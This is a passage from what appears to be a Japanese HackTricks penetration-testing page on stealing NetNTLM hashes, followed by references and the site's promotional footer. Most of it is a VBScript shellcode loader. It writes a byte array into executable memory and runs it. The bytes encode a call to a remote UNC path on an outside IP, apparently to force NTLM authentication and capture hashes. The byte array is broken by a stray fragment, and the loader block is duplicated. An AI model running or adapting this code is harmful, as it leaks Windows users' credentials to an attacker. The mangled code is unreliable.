&He8, &Hff, &Hff, &Hff, &Hff, &Hc0, &H5f, &Hb9, &H55, &H03, &H02, &H02, &H81, &Hf1, &H02, &H02, &H02, &H02, &H83, &Hc7, _
&H1d, &H33, &Hf6, &Hfc, &H8a, &H07, &H3c, &H05, &H0f, &H44, &Hc6, &Haa, &He2, &Hf6, &He8, &H05, &H05, &H05, &H05, &H5e, _
&H8b, &Hfe, &H81, &Hc6, &H29, &H01, &H05, &H05, &Hb9, &H02, &H05, &H05, &H05, &Hfc, &Had, &H01, &H3c, &H07, &He2, &Hfa, _
&H56, &Hb9, &H8d, &H10, &Hb7, &Hf8, &He8, &H5f, &H05, &H05, &H05, &H68, &H31, &H01, &H05, &H05, &Hff, &Hd0, &Hb9, &He0, _
&H53, &H31, &H4b, &He8, &H4e, &H05, &H05, &H05, &Hb9, &Hac, &Hd5, &Haa, &H88, &H8b, &Hf0, &He8, &H42, &H05, &H05, &H05, _
&H6a, &H05, &H68, &H80, &H05, &H05, &H05, &H6a, &H03, &H6a, &H05, &H6a, &H01, &H68, &H05, &H05, &H05, &H80, &H68, &H3e, _
&H01, &H05, &H05, &Hff, &Hd0, &H6a, &H05, &Hff, &Hd6, &H33, &Hc0, &H5e, &Hc3, &H33, &Hd2, &Heb, &H10, &Hc1, &Hca, &H0d, _
&H3c, &H61, &H0f, &Hbe, &Hc0, &H7c, &H03, &H83, &He8, &H20, &H03, &Hd0, &H41, &H8a, &H01, &H84, &Hc0, &H75, &Hea, &H8b, _
&Hc2, &Hc3, &H8d, &H41, &Hf8, &Hc3, &H55, &H8b, &Hec, &H83, &Hec, &H14, &H53, &H56, &H57, &H89, &H4d, &Hf4, &H64, &Ha1, _
&H30, &H05, &H05, &H05, &H89, &H45, &Hfc, &H8b, &H45, &Hfc, &H8b, &H40, &H0c, &H8b, &H40, &H14, &H89, &H45, &Hec, &H8b, _
&Hf8, &H8b, &Hcf, &He8, &Hd2, &Hff, &Hff, &Hff, &H8b, &H70, &H18, &H8b, &H3f, &H85, &Hf6, &H74, &H4f, &H8b, &H46, &H3c, _
&H8b, &H5c, &H30, &H78, &H85, &Hdb, &H74, &H44, &H8b, &H4c, &H33, &H0c, &H03, &Hce, &He8, &H96, &Hff, &Hff, &Hff, &H8b, _
&H4c, &H33, &H20, &H89, &H45, &Hf8, &H33, &Hc0, &H03, &Hce, &H89, &H4d, &Hf0, &H89, &H45, &Hfc, &H39, &H44, &H33, &H18, _
&H76, &H22, &H8b, &H0c, &H81, &H03, &Hce, &He8, &H75, &Hff, &Hff, &Hff, &H03, &H45, &Hf8, &H39, &H45, &Hf4, &H74, &H1c, _
&H8b, &H45, &Hfc, &H8b, &H4d, &Hf0, &H40, &H89, &H45, &Hfc, &H3b, &H44, &H33, &H18, &H72, &Hde, &H3b, &H7d, &Hec, &H75, _
&H9c, &H33, &Hc0, &H5f, &H5e, &H5b, &Hc9, &Hc3, &H8b, &H4d, &Hfc, &H8b, &H44, &H33, &H24, &H8d, &H04, &H48, &H0f, &Hb7, _
&H0c, &H30, &H8b, &H44, &H33, &H1c, &H8d, &H04, &H88, &H8b, &H04, &H30, &H03, &Hc6, &Heb, &Hdf, &H21, &H05, &H05, &H05, _
```html
<H50, &H05, &H05, &H05, &H6b, &H65, &H72, &H6e, &H65, &H6c, &H33, &H32, &H2e, &H64, &H6c, &H6c, &H05, &H2f, &H2f, &H33, _
&H35, &H2e, &H31, &H36, &H34, &H2e, &H31, &H35, &H33, &H2e, &H32, &H32, &H34, &H2f, &H61, &H61, &H05)

scLocation = DX.VirtualAlloc(0, UBound(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)

For i =LBound(shellcode) to UBound(shellcode)
DX.NumPut shellcode(i),scLocation,i
Next

thread = DX.CreateThread (0,0,scLocation,0,0)
```
```html
<H50, &H05, &H05, &H05, &H6b, &H65, &H72, &H6e, &H65, &H6c, &H33, &H32, &H2e, &H64, &H6c, &H6c, &H05, &H2f, &H2f, &H33, _
&H35, &H2e, &H31, &H36, &H34, &H2e, &H31, &H35, &H33, &H2e, &H32, &H32, &H34, &H2f, &H61, &H61, &H05)

scLocation = DX.VirtualAlloc(0, UBound(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)

For i =LBound(shellcode) to UBound(shellcode)
DX.NumPut shellcode(i),scLocation,i
Next

thread = DX.CreateThread (0,0,scLocation,0,0)
```
[https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vbs](https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vbs)

Windowsには他にも多くの方法があるかもしれません。わかりません！ 🙂

## 参考文献

* [**https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/**](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
* [https://attack.mitre.org/techniques/T1187/](https://attack.mitre.org/techniques/T1187/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で**私をフォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
